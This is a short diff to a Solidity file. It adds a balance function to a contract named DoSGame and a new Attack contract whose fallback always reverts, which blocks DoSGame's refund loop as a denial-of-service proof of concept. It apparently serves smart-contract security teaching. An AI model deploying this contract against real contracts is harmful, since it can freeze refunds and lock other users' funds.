@@ -25,4 +25,19 @@ contract DoSGame {
         }
         refundFinished = true;
     }
+
+    function balance() external view returns(uint256){
+        return address(this).balance;
+    }
+}
+
+contract Attack {
+    fallback() external payable {
+        revert("Dos Attack!");
+    }
+
+    function attack(address gameAddr) external payable {
+        DoSGame dos = DoSGame(gameAddr);
+        dos.deposit{value: msg.value}();
+    }
 }
